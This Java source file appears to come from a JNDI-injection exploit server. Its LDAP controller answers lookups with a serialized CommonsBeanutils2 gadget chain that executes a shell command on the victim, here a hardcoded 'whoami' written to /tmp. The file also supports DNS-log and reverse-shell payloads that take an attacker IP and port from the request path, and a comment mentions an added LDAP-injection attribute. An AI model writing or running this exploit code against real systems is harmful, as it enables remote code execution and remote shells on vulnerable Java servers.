package com.feihong.ldap.controllers;

import com.feihong.ldap.enumtypes.GadgetType;
import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.exceptions.IncorrectParamsException;
import com.feihong.ldap.exceptions.UnSupportedGadgetTypeException;
import com.feihong.ldap.exceptions.UnSupportedPayloadTypeException;
import com.feihong.ldap.utils.*;
import com.feihong.ldap.gadgets.*;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

@LdapMapping(uri = { "/2deserialization" })
public class SerializedDataController3 implements LdapController {
    private GadgetType gadgetType = GadgetType.commonsbeanutils2;
    private PayloadType payloadType = PayloadType.command;
    private String[] params = new String[]{"/bin/bash", "-c", "whoami", ">", "/tmp/whoami7.txt"};

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println("[+] Send LDAP result for " + base + " with javaSerializedData attribute");

        //这个方法里面有改动，其他基本无改动
        Entry e = new Entry(base);
        byte[] bytes = null;
        bytes = CommonsBeanutils2.getBytes(payloadType, params);

        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaSerializedData",bytes);
        e.addAttribute("objectClass", bytes);    // added for ldap injection on 2023/4/29
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));

        System.out.println("[+] Done Sending LDAP ResourceRef result");
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException {
        try{

            gadgetType = GadgetType.commonsbeanutils2;
            payloadType = PayloadType.command;


            switch(payloadType){
                case dnslog:
                    String url = base.substring(base.lastIndexOf("/") + 1);
                    System.out.println("[+] URL: " + url);
                    params = new String[]{url};
                    break;
                case command:
                    break;
                case reverseshell:
                    String[] results = Util.getIPAndPortFromBase(base);
                    System.out.println("[+] IP: " + results[0]);
                    System.out.println("[+] Port: " + results[1]);
                    params = results;
                    break;
            }

        }catch(Exception e){
            if(e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException)e;
            if(e instanceof UnSupportedGadgetTypeException) throw (UnSupportedGadgetTypeException)e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }

    public static void main(String[] args) {
        String base = "";
        String type = "";
        int firstIndex = base.indexOf("/");
        System.out.println(firstIndex);
        int secondIndex = base.indexOf("/", firstIndex + 1);
        System.out.println(secondIndex);

        if( base.indexOf("Base64") > 0){
            type = base.substring(firstIndex + 1, secondIndex).toLowerCase();
        }

        System.out.println(type);
    }
}
